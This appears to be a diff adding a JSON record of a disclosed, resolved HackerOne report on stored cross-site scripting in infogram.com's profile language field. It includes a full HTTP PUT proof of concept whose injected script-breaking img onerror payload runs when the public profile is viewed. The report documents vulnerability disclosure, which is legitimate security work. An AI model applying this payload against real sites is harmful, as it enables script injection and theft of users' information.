@@ -1,0 +1,131 @@
+{
+  "id": 430029,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MzAwMjk=",
+  "url": "https://hackerone.com/reports/430029",
+  "title": "Stored XSS in infogram.com via language ",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-10-28T21:18:50.797Z",
+  "submitted_at": "2018-10-28T21:18:50.797Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "theappsec",
+    "url": "/theappsec",
+    "profile_picture_urls": {
+      "small": "https://hackerone.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6MzkwMjgsInB1ciI6ImJsb2JfaWQifX0=--cd574b1f939b51145cc1bcf01bc2851a1cae1464/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJqcGciLCJncmF2aXR5IjoiQ2VudGVyIiwicmVzaXplIjoiNjJ4NjJeIiwiY3JvcCI6IjYyeDYyKzArMCJ9LCJwdXIiOiJ2YXJpYXRpb24ifX0=--2de8067d228529d65848a4eeed0bed0bb2531bc3/avatar.jpg"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 21745,
+    "url": "https://hackerone.com/infogram",
+    "handle": "infogram",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/021/745/553edf21f45ba8f73faba5d308e0d91fc026fef0_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/021/745/553edf21f45ba8f73faba5d308e0d91fc026fef0_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Infogram",
+      "twitter_handle": "infogram",
+      "website": "http://infogram.com",
+      "about": "Make Infographics and Charts that People Love"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2019-06-22T07:54:17.827Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-05-23T07:54:15.625Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "The stored XSS was found in the language profile parameter.\n\nPOC:\nChange profile settings with following request:\n\n```http\nPUT /api/users/me HTTP/1.1\nHost: infogram.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\ncsrf-token: **your token**\nX-Requested-With: XMLHttpRequest\nContent-Length: 135\nDNT: 1\nConnection: close\nCookie: **your cookies**\n\nfirst_name=name&last_name=name&username=&confirm_password=password&language=></script><img src=x onerror=alert(document.domain)>;//\n```\nGo to your public profile link.\n\nexample: https://infogram.com/dd_ddt7\n\n## Impact\n\nThis allows an attacker to inject custom Javascript codes that can be used to steal information from infogram's users.",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 367600,
+      "file_name": "Selection_088.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/367/600/05b02b9c44bb1da9c93aab54cf297910acd92a80/Selection_088.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_088.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_088.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQT5SD3VK2%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T152027Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQClRXfVQ6TcJFROTF%2BD0LDL4IptBemJc5EMG848%2FCEiSQIhAKDXmyowzdpDu4zfEapkWcuivUF63JNAxYz2favlbU6bKrIFCBcQAxoMMDEzNjE5Mjc0ODQ5IgyKlpw5OowlLiWsLL8qjwU0D29xrhlZFCfHcqjeZqnfiyItH0QCdyaKA%2F8%2BPGpNz2JgpL6QTAwDZCtHYpJ2OsSV%2Fr0t%2BhiNft4faKC3j2Re4gXFlwXAzQ3UGuAAGxcwgIc7gFmPcZWE0SRhBdJmk2S%2BJos09tCiFdi%2FbxRyB3zF64dzD5fSumyqcEn%2B2Vnd00pMBX742VkbEf7ZrNuyB62b1ytaX9jj9uvCFABG55FHDM%2Bs37wZacobZcdYBUPtU2XeZTkWX7AKGe%2FYmNjN%2FCI%2BxIoV7xxTqcG%2Baq7erC61AYhVA5BQfpjdl1bhHpa12u1DFE7HS57F97QReN6xh059bv%2FTllJIx8plaNjjH2jyflJMGw0Dw2DMiRrS7tIxJhQLAjBMb4C4V7N%2BM%2BaYvfy8%2FfbziqtvAUL8KMu6JyAjiQFuRhibIpqiMs3vU1r2o3TaJvpwb%2F9%2B0noBVyL2mEXDZLSZXRNCnvTiCzHLsk87FJVYtRr2awVVN9HtLz2KvmKgDreKiPAOXfPCFtAQa9YLiWIPUuVtgioN9ZBo5xJaCCyMGIzCh%2Fkrs1a0DcWy4F7Ytp4jBJcaMTR19B9HxNJL3aj8fMZlif8A0f0aaG%2FBgx7o5981IkRN3fvdIme%2FGy59thdwpQWaGEcGFmbADJgW%2FUetzXfy4OHnAUuQN5g8tkLNZhOOMkLBC3kLLrbfeiTttC8hssEuonPS5FvdddJqvftgcN%2Btb6H%2B1mYkyDlIcS6dii1q%2BhZizteMV9E0OBg1K8Ylk36UwJ3sW%2B8VxpTiVst%2FCObvfePMpGyI10NWIZQWKo%2BbxnzRUnD14TtT5uqbGn0QUuAEyUMWhQFS5SK5ZjRVCzQKPJTjGtT1RulMo59rlIi8SANcD1u8orU0MJP5v8YGOrABxqGEwH2lu%2FSIiLkjMB93i6n75LP7E6dFaf8U2coeh%2FJFyPT0Fob%2BvLKn7heOlHaTP86GXxcuQ%2F7dOAFxfCcMZJwPoTg4MLVffgesdH3XcR6WccyCO7CULPqRy39ydkdy5bAD0rlIb4KBU4W2miAyLWCv5A8%2BACxOO2Y%2BdrmDICvpHOjLOqM2jQrXEsy42y2NRm8%2FtGBFtSOfk9J9G5g0mOcoHMA4EPWmf7LR9VvpFQc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ed710c533cbac08fc8008d83ed46b0056216df3e9ad0682d95014ce6f212cd6c",
+      "file_size": 28579,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2019-06-22T07:54:15.686Z",
+  "allow_singular_disclosure_after": -197277971.324331,
+  "singular_disclosure_allowed": true,
+  "vote_count": 20,
+  "voters": [
+    "ali",
+    "sameerphad72",
+    "yinvi777",
+    "nullsecisroot",
+    "khizer47",
+    "sa1tama0",
+    "bb00x",
+    "tiago-danin",
+    "th3r4id",
+    "cipherboy",
+    "and 10 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 870,
+    "asset_type": "URL",
+    "asset_identifier": "infogram.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
